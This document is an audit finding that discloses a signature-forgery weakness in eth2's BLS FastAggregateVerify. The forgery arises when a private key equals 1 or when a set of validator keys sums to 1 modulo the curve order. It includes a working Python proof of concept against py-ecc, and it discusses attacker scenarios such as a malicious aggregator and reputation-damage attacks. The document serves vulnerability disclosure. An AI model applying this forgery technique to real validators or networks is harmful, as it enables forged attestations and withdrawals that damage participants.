# Audit Findings

## Vulnerabilities of BLS' FastAggregateVerify via partitions of unity  
## Table of Contents
1. [Description](#Description)
2. [Risk Factors](#Risk-Factors)
3. [PoC](#PoC)
4. [References](#References)

## Description

The Bls signature scheme utilized by eth2 allows for an attacker to generate signatures considered valid by `FastAggregateVerify` in some circumstances. 
For a constant message `m` signed by `n` private/public keys `s_i/pk_i` and , an aggreated signature 

    sig = sig_1 + ... + sig_n 

is considered valid if:

    e(g_1, sig) = e(g_1,(s_1+...+s_n)H(m)) = e(pk_1+...+pk_n,H(m)).

This construction is vulnerable, if `s_1+...+s_n = 1`, as in this case a valid signature is given by the hash of the message `e(g_1, sig) = e(g_1,H(m))` and is therefore forgeable.

Two cases of this attack are considered in this report:

The special case `s = 1`, where a the field identity element is chosen as by private key (by chance, misconfiguration or user error). `s = 1` is erroneously specified as a valid output of the private key generation procedure (KeyGen) in the [BLS RFC]([https://tools.ietf.org/html/draft-irtf-cfrg-bls-signature-04#section-2.3]
), while this case is easy to detect for an attacker and all cryptographic assumptions are broken. An initial review (py-ecc, herumi) suggested, that all eth2 BLS libraries are affected, as the RFC is flawed.

The general case `s_1 + ... + s_n = 1 % curve_order` requires a set of private keys to be a partition of unity, which can be detected by an attacker without knowledge of any secret keys by observing p2p traffic. The general case can occur due to adversarial behaviour or for stochastic reasons. The likelihood of the latter is currently being reviewed and quantified, as it depends on several factors, namely the size of the validator set, committees and in particular the number of partitions of unity`p(1) modular curve_order`.

In the context of eth2, the exploitability of the vulnerabilities differs for the two cases:

* For the case `s = 1`, an attacker can forge signatures for all types of messages by vulnerable validator (withdrawals, slashable proposals and attestations) 
* For the case `s_1 + ... + s_n = 1 % curve_order`, an attacker  (e.g. a malicious aggregator) that captures p2p traffic can produce valid signatures for aggregated attestations of a subset of validator who's private keys add up to 1. 
An attacker might also maliciously create validators with such private keys and afterwards deny to have signed a given (slashable) message due to the cryptographic error, to inflict reputation damage. 



## Risk Factors

  - Once known, the vulnerabilities are relatively easy to exploit
  - The number of possible partitions of unity in high order prime fields/curves, implemented in eth2 is currently being quantified. It is not yet known if sets of validators are currently vulnerable, if they are assigned to a commitee   
  - it is hard to detect for nodes if they are being attacked, as the attacks can be mounted remotely and no explicit preconditions are required
  - it is hard to trace back the attack to a specific entity, as essentially only p2p messages are required 
  - So far, no validator has registered the public key corresponding validator key `s = 1`  
  - Attackers might construct vulnerable validator sets and launch the attack to inflict reputation damage to the ethereum community and profit via shorting  
    
## PoC for Py-ecc   

```
from py_ecc.bls import G2ProofOfPossession as bls
from py_ecc.bls.g2_primitives import *
from py_ecc.optimized_bls12_381.optimized_curve import *
from py_ecc.bls.hash_to_curve import hash_to_G2
from hashlib import sha256

import structlog

log = structlog.get_logger()


def test_partition_of_unity():
    """
    This test shows a weakness in bls.FastAggregateVerify, when private keys are a partition to 1 (1 = sk_0 + .... +
    sk_n % curve_order, with the special case private_key = 1 mod curve_order). If priv_key = 1, anyone can create a
    signature of a messages (withdrawal, slashable casper proposals, etc...) For the general case, under specific
    circumstances, an attacker (for instance, a malicious aggregator) can create universal forgeries of the
    aggregated signatures of a subset of validators. In practice, for a set of validators in a committee,
    who's private_keys sum up to 1. If this is the case can be detected by an attacker without knowledge of any
    private keys, by analyzing p2p traffic for the property bls.Aggregate([sig0, ..., sign] == message_hash. The
    likelihood of a partition to be observable in the wild depends on the size of the validator set and p(1),
    the number of possible partitions of 1 % curve_order. This likelihood is currently being reviewed. For reference:
    https://doi.org/10.2307/1993300
    """

    # boilerplate
    m = b"message"

    # private key is the multiplicative identity element
    sk0 = 1

    sk1 = 2880067194370816120
    sk2 = 354224848179261915075
    DST = b"BLS_SIG_BLS12381G2_XMD:SHA-256_SSWU_RO_POP_"

    # generating the message hash, a universally forgeable signature for a specific set of private keys
    message_hash = G2_to_signature(hash_to_G2(m, DST, hash_function=sha256))

    # BASE CASE: sk == 1

    one_key = G1_to_pubkey(G1)
    one_public_key = bls.SkToPk(sk0)
    # The public Key here is just the curve's generator
    assert one_key == one_public_key
    pk1 = bls.SkToPk(sk1)
    pk2 = bls.SkToPk(sk2)

    one_sigm = bls.Sign(sk0, m)

    # this is the bug allowing an attacker to create a universal forgery in the special case sk == 1
    assert one_sigm == message_hash
    sigm1 = bls.Sign(sk1, m)
    sigm2 = bls.Sign(sk2, m)

    log.msg(
        "If private key == 1 % curve_order, the signature is just the message hash and can be generated by anyone",
        verification_result=bls.FastAggregateVerify(
            [one_key, pk1, pk2], m, bls.Aggregate([message_hash, sigm1, sigm2])
        ),
    )

    # GENERAL CASE: 1 = sk_0 + .... + sk_n % curve_order

    def generate_additive_inverse(sk: int) -> list[int]:
        """
        For the PoC, we only create order 2 partitions (e.g. consisting of a private key and its additive inverses).
        In general any partition of order < MAX_VALIDATORS_PER_COMMITEE is viable in the context of eth2. The number
        of possible partitions of one % curve_order and therefore the likelihood of a partition to be observable by
        an attacker in the wild is currently being reviewed. For reference: https://doi.org/10.2307/1993300
        """
        additive_inverse = curve_order - sk + 1
        assert ((additive_inverse + sk) % curve_order) == 1
        return [sk, additive_inverse]

    private_keys = generate_additive_inverse(sk2)
    public_keys = [bls.SkToPk(priv_key) for priv_key in private_keys]
    signatures = [bls.Sign(priv_key, m) for priv_key in private_keys]
    assert len(public_keys) > 1
    assert len(signatures) > 1

    # check everything follows protocol
    for private_key in private_keys:
        assert bls._is_valid_privkey(private_key)
    for public_key in public_keys:
        assert bls._is_valid_pubkey(public_key)
    for signature in signatures:
        assert bls._is_valid_signature(signature)

    # this is the bug in the general case 1 = sk_0 + ... + sk_n, allowing an attacker to create a universal forgery
    # of a signature valid for FastAggregateVerify
    assert bls.Aggregate(signatures) == message_hash
    assert bls.FastAggregateVerify(public_keys, m, message_hash)
    assert not bls.AggregateVerify(public_keys, m, message_hash)


    log.msg(
        "For the general case, if 1 = (sk_0 + .... + sk_n) % curve_order, the aggregated signature is just the hash "
        "of the message and can be generated by anyone",
        verification_result=bls.FastAggregateVerify(public_keys, m, message_hash),
    )

```

## References
**[BLS Note]** https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html#mjx-eqn-eqaggdiff

**[BLS RFC]** [https://tools.ietf.org/html/draft-irtf-cfrg-bls-signature-04#section-2.3]

**[PERIODICITY MODULO m AND DIVISIBILITY
PROPERTIES OF THE PARTITION
FUNCTION]** https://www.ams.org/journals/tran/1960-097-02/S0002-9947-1960-0115981-2/S0002-9947-1960-0115981-2.pdf